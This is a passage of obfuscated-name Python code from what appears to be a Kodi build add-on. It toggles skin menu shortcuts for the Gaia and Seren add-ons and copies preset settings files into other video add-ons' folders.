    O00OO0OOOOOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:557
    with open (O00OO0OOOOOO000O0 ,'r')as O000O0OOOOO0OOO0O :#line:558
      OO0OO0O0O0O0O0O0O =O000O0OOOOO0OOO0O .read ()#line:559
    OO0OO0O0O0O0O0O0O =OO0OO0O0O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:577
    with open (O00OO0OOOOOO000O0 ,'w')as O000O0OOOOO0OOO0O :#line:580
      O000O0OOOOO0OOO0O .write (OO0OO0O0O0O0O0O0O )#line:581
    O00OO0OOOOOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:584
    with open (O00OO0OOOOOO000O0 ,'r')as O000O0OOOOO0OOO0O :#line:585
      OO0OO0O0O0O0O0O0O =O000O0OOOOO0OOO0O .read ()#line:586
    OO0OO0O0O0O0O0O0O =OO0OO0O0O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:604
    with open (O00OO0OOOOOO000O0 ,'w')as O000O0OOOOO0OOO0O :#line:607
      O000O0OOOOO0OOO0O .write (OO0OO0O0O0O0O0O0O )#line:608
    O00OO0OOOOOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:610
    with open (O00OO0OOOOOO000O0 ,'r')as O000O0OOOOO0OOO0O :#line:611
      OO0OO0O0O0O0O0O0O =O000O0OOOOO0OOO0O .read ()#line:612
    OO0OO0O0O0O0O0O0O =OO0OO0O0O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:630
    with open (O00OO0OOOOOO000O0 ,'w')as O000O0OOOOO0OOO0O :#line:633
      O000O0OOOOO0OOO0O .write (OO0OO0O0O0O0O0O0O )#line:634
    O00OO0OOOOOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:636
    with open (O00OO0OOOOOO000O0 ,'r')as O000O0OOOOO0OOO0O :#line:637
      OO0OO0O0O0O0O0O0O =O000O0OOOOO0OOO0O .read ()#line:638
    OO0OO0O0O0O0O0O0O =OO0OO0O0O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:656
    with open (O00OO0OOOOOO000O0 ,'w')as O000O0OOOOO0OOO0O :#line:659
      O000O0OOOOO0OOO0O .write (OO0OO0O0O0O0O0O0O )#line:660
    O00OO0OOOOOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:663
    with open (O00OO0OOOOOO000O0 ,'r')as O000O0OOOOO0OOO0O :#line:664
      OO0OO0O0O0O0O0O0O =O000O0OOOOO0OOO0O .read ()#line:665
    OO0OO0O0O0O0O0O0O =OO0OO0O0O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:683
    with open (O00OO0OOOOOO000O0 ,'w')as O000O0OOOOO0OOO0O :#line:686
      O000O0OOOOO0OOO0O .write (OO0OO0O0O0O0O0O0O )#line:687
def rdbuildinstall ():#line:690
  try :#line:691
   OOOOOOO0OO00O0OO0 =(ADDON .getSetting ("rdbuild"))#line:692
   if OOOOOOO0OO00O0OO0 =='true':#line:693
     O000OO0O00000O0OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:694
     OO0O0OO0OOO00O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:695
     copyfile (O000OO0O00000O0OO ,OO0O0OO0OOO00O0OO )#line:696
  except :#line:697
     pass #line:698
def rdbuildaddonoff ():#line:701
    O00OOO0OOOO0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:704
    with open (O00OOO0OOOO0OO000 ,'r')as OOO0000000OOOO0OO :#line:705
      O0O000000O0O0O00O =OOO0000000OOOO0OO .read ()#line:706
    O0O000000O0O0O00O =O0O000000O0O0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:724
    with open (O00OOO0OOOO0OO000 ,'w')as OOO0000000OOOO0OO :#line:727
      OOO0000000OOOO0OO .write (O0O000000O0O0O00O )#line:728
    O00OOO0OOOO0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:732
    with open (O00OOO0OOOO0OO000 ,'r')as OOO0000000OOOO0OO :#line:733
      O0O000000O0O0O00O =OOO0000000OOOO0OO .read ()#line:734
    O0O000000O0O0O00O =O0O000000O0O0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:752
    with open (O00OOO0OOOO0OO000 ,'w')as OOO0000000OOOO0OO :#line:755
      OOO0000000OOOO0OO .write (O0O000000O0O0O00O )#line:756
    O00OOO0OOOO0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:760
    with open (O00OOO0OOOO0OO000 ,'r')as OOO0000000OOOO0OO :#line:761
      O0O000000O0O0O00O =OOO0000000OOOO0OO .read ()#line:762
    O0O000000O0O0O00O =O0O000000O0O0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:780
    with open (O00OOO0OOOO0OO000 ,'w')as OOO0000000OOOO0OO :#line:783
      OOO0000000OOOO0OO .write (O0O000000O0O0O00O )#line:784
    O00OOO0OOOO0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:788
    with open (O00OOO0OOOO0OO000 ,'r')as OOO0000000OOOO0OO :#line:789
      O0O000000O0O0O00O =OOO0000000OOOO0OO .read ()#line:790
    O0O000000O0O0O00O =O0O000000O0O0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:808
    with open (O00OOO0OOOO0OO000 ,'w')as OOO0000000OOOO0OO :#line:811
      OOO0000000OOOO0OO .write (O0O000000O0O0O00O )#line:812
    O00OOO0OOOO0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:815
    with open (O00OOO0OOOO0OO000 ,'r')as OOO0000000OOOO0OO :#line:816
      O0O000000O0O0O00O =OOO0000000OOOO0OO .read ()#line:817
    O0O000000O0O0O00O =O0O000000O0O0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:835
    with open (O00OOO0OOOO0OO000 ,'w')as OOO0000000OOOO0OO :#line:838
      OOO0000000OOOO0OO .write (O0O000000O0O0O00O )#line:839
    O00OOO0OOOO0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:841
    with open (O00OOO0OOOO0OO000 ,'r')as OOO0000000OOOO0OO :#line:842
      O0O000000O0O0O00O =OOO0000000OOOO0OO .read ()#line:843
    O0O000000O0O0O00O =O0O000000O0O0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:861
    with open (O00OOO0OOOO0OO000 ,'w')as OOO0000000OOOO0OO :#line:864
      OOO0000000OOOO0OO .write (O0O000000O0O0O00O )#line:865
    O00OOO0OOOO0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:867
    with open (O00OOO0OOOO0OO000 ,'r')as OOO0000000OOOO0OO :#line:868
      O0O000000O0O0O00O =OOO0000000OOOO0OO .read ()#line:869
    O0O000000O0O0O00O =O0O000000O0O0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:887
    with open (O00OOO0OOOO0OO000 ,'w')as OOO0000000OOOO0OO :#line:890
      OOO0000000OOOO0OO .write (O0O000000O0O0O00O )#line:891
    O00OOO0OOOO0OO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:894
    with open (O00OOO0OOOO0OO000 ,'r')as OOO0000000OOOO0OO :#line:895
      O0O000000O0O0O00O =OOO0000000OOOO0OO .read ()#line:896
    O0O000000O0O0O00O =O0O000000O0O0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:914
    with open (O00OOO0OOOO0OO000 ,'w')as OOO0000000OOOO0OO :#line:917
      OOO0000000OOOO0OO .write (O0O000000O0O0O00O )#line:918
def rdbuildinstalloff ():#line:921
    try :#line:922
       O0000O0000OOO0O00 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:923
       OO00O000OO0OOOO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:924
       copyfile (O0000O0000OOO0O00 ,OO00O000OO0OOOO0O )#line:926
       O0000O0000OOO0O00 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:928
       OO00O000OO0OOOO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:929
       copyfile (O0000O0000OOO0O00 ,OO00O000OO0OOOO0O )#line:931
       O0000O0000OOO0O00 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:933
       OO00O000OO0OOOO0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:934
       copyfile (O0000O0000OOO0O00 ,OO00O000OO0OOOO0O )#line:936
       O0000O0000OOO0O00 =ADDONPATH +"/resources/rdoff/Splash.png"#line:939
       OO00O000OO0OOOO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:940
       copyfile (O0000O0000OOO0O00 ,OO00O000OO0OOOO0O )#line:942
    except :#line:944
       pass #line:945
def rdbuildaddonON ():#line:952
    O0OO0OO0O00O0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:954
    with open (O0OO0OO0O00O0O0O0 ,'r')as OO0OOOOOOOOO0000O :#line:955
      O0O000O0O0O00OOOO =OO0OOOOOOOOO0000O .read ()#line:956
    O0O000O0O0O00OOOO =O0O000O0O0O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:974
    with open (O0OO0OO0O00O0O0O0 ,'w')as OO0OOOOOOOOO0000O :#line:977
      OO0OOOOOOOOO0000O .write (O0O000O0O0O00OOOO )#line:978
    O0OO0OO0O00O0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:982
    with open (O0OO0OO0O00O0O0O0 ,'r')as OO0OOOOOOOOO0000O :#line:983
      O0O000O0O0O00OOOO =OO0OOOOOOOOO0000O .read ()#line:984
    O0O000O0O0O00OOOO =O0O000O0O0O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1002
    with open (O0OO0OO0O00O0O0O0 ,'w')as OO0OOOOOOOOO0000O :#line:1005
      OO0OOOOOOOOO0000O .write (O0O000O0O0O00OOOO )#line:1006
    O0OO0OO0O00O0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1010
    with open (O0OO0OO0O00O0O0O0 ,'r')as OO0OOOOOOOOO0000O :#line:1011
      O0O000O0O0O00OOOO =OO0OOOOOOOOO0000O .read ()#line:1012
    O0O000O0O0O00OOOO =O0O000O0O0O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1030
    with open (O0OO0OO0O00O0O0O0 ,'w')as OO0OOOOOOOOO0000O :#line:1033
      OO0OOOOOOOOO0000O .write (O0O000O0O0O00OOOO )#line:1034
    O0OO0OO0O00O0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1038
    with open (O0OO0OO0O00O0O0O0 ,'r')as OO0OOOOOOOOO0000O :#line:1039
      O0O000O0O0O00OOOO =OO0OOOOOOOOO0000O .read ()#line:1040
    O0O000O0O0O00OOOO =O0O000O0O0O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1058
    with open (O0OO0OO0O00O0O0O0 ,'w')as OO0OOOOOOOOO0000O :#line:1061
      OO0OOOOOOOOO0000O .write (O0O000O0O0O00OOOO )#line:1062
    O0OO0OO0O00O0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1065
    with open (O0OO0OO0O00O0O0O0 ,'r')as OO0OOOOOOOOO0000O :#line:1066
      O0O000O0O0O00OOOO =OO0OOOOOOOOO0000O .read ()#line:1067
    O0O000O0O0O00OOOO =O0O000O0O0O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1085
    with open (O0OO0OO0O00O0O0O0 ,'w')as OO0OOOOOOOOO0000O :#line:1088
      OO0OOOOOOOOO0000O .write (O0O000O0O0O00OOOO )#line:1089
    O0OO0OO0O00O0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1091
    with open (O0OO0OO0O00O0O0O0 ,'r')as OO0OOOOOOOOO0000O :#line:1092
      O0O000O0O0O00OOOO =OO0OOOOOOOOO0000O .read ()#line:1093
    O0O000O0O0O00OOOO =O0O000O0O0O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1111
    with open (O0OO0OO0O00O0O0O0 ,'w')as OO0OOOOOOOOO0000O :#line:1114
      OO0OOOOOOOOO0000O .write (O0O000O0O0O00OOOO )#line:1115
    O0OO0OO0O00O0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1117
    with open (O0OO0OO0O00O0O0O0 ,'r')as OO0OOOOOOOOO0000O :#line:1118
      O0O000O0O0O00OOOO =OO0OOOOOOOOO0000O .read ()#line:1119
    O0O000O0O0O00OOOO =O0O000O0O0O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1137
    with open (O0OO0OO0O00O0O0O0 ,'w')as OO0OOOOOOOOO0000O :#line:1140
      OO0OOOOOOOOO0000O .write (O0O000O0O0O00OOOO )#line:1141
    O0OO0OO0O00O0O0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1144
    with open (O0OO0OO0O00O0O0O0 ,'r')as OO0OOOOOOOOO0000O :#line:1145
      O0O000O0O0O00OOOO =OO0OOOOOOOOO0000O .read ()#line:1146
    O0O000O0O0O00OOOO =O0O000O0O0O00OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1164
    with open (O0OO0OO0O00O0O0O0 ,'w')as OO0OOOOOOOOO0000O :#line:1167
      OO0OOOOOOOOO0000O .write (O0O000O0O0O00OOOO )#line:1168
def rdbuildinstallON ():#line:1171
    try :#line:1173
       OO00O00OO0OO0OO0O =ADDONPATH +"/resources/rd/victory.xml"#line:1174
       OOO0O0000O00O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1175
       copyfile (OO00O00OO0OO0OO0O ,OOO0O0000O00O0O00 )#line:1177
       OO00O00OO0OO0OO0O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1179
       OOO0O0000O00O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1180
       copyfile (OO00O00OO0OO0OO0O ,OOO0O0000O00O0O00 )#line:1182
       OO00O00OO0OO0OO0O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1184
       OOO0O0000O00O0O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1185
       copyfile (OO00O00OO0OO0OO0O ,OOO0O0000O00O0O00 )#line:1187
       OO00O00OO0OO0OO0O =ADDONPATH +"/resources/rd/Splash.png"#line:1190
       OOO0O0000O00O0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1191
       copyfile (OO00O00OO0OO0OO0O ,OOO0O0000O00O0O00 )#line:1193
    except :#line:1195
       pass #line:1196
def rdbuild ():#line:1206
	OO00O00O00O000OOO =(ADDON .getSetting ("rdbuild"))#line:1207
	if OO00O00O00O000OOO =='true':#line:1208
		O000O00000OOO000O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1209
